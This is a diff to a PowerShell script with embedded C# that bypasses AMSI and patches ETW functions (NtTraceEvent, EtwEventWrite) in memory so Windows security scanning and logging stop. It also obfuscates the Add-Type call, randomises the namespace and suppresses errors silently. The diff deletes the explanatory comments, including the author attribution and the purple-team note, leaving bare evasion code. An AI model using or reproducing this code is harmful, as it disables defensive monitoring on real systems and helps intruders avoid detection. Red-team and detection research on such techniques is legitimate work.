@@ -3,10 +3,6 @@ $randomId = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
 $namespace = "Sec$randomId"
 
 $RuntimeDefinition = @"
-// Enhanced evasion technique combining AMSI and ETW bypasses
-// Original AMSI technique from @_EthicalChaos_ and @d_tranman
-// ETW patching addition for enhanced evasion testing
-// Modified by Marc Peacock for purple team engagement (19/08/2025)
 
 using System;
 using System.Collections.Generic;
@@ -40,15 +36,12 @@ namespace $namespace
         {
             try
             {
-                // Initialise AMSI bypass
                 ConfigureAMSIBypass();
                 
-                // Initialise ETW bypass
                 ConfigureETWBypass();
             }
             catch
             {
-                // Silent error handling
             }
         }
         
@@ -79,7 +72,6 @@ namespace $namespace
         {
             try
             {
-                // Patch NtTraceEvent - returns STATUS_SUCCESS without logging
                 byte[] retPatch = { 0x48, 0x31, 0xC0, 0xC3 }; // xor rax, rax; ret
                 
                 if (pNtTraceEvent != IntPtr.Zero)
@@ -90,7 +82,6 @@ namespace $namespace
                     RuntimeAPI.VirtualProtect(pNtTraceEvent, (UIntPtr)retPatch.Length, oldProtect1, out oldProtect2);
                 }
                 
-                // Patch EtwEventWrite as well for comprehensive coverage
                 if (pEtwEventWrite != IntPtr.Zero)
                 {
                     uint oldProtect1, oldProtect2;
@@ -101,7 +92,6 @@ namespace $namespace
             }
             catch
             {
-                // Silently continue if ETW patching fails
             }
         }
         
@@ -352,7 +342,6 @@ namespace $namespace
 "@
 
 try {
-    # Obfuscated execution to reduce static detection
     $TypeCommand = "Add" + "-" + "Type"
     $Parameters = @{
         TypeDefinition = $RuntimeDefinition
@@ -361,13 +350,11 @@ try {
 
     & $TypeCommand @Parameters
 
-    # Initialize both bypasses using dynamic namespace
     $runtimeType = "$namespace.RuntimeManager" -as [type]
     if ($runtimeType) {
         $runtimeType::InitializeEnvironment()
     }
 
-    # Optional: Add additional ETW provider disabling for comprehensive coverage
     try {
         $etwProviders = @(
             "Microsoft-Windows-PowerShell",
@@ -384,5 +371,4 @@ try {
     } catch {}
     
 } catch {
-    # Silent error handling
 }
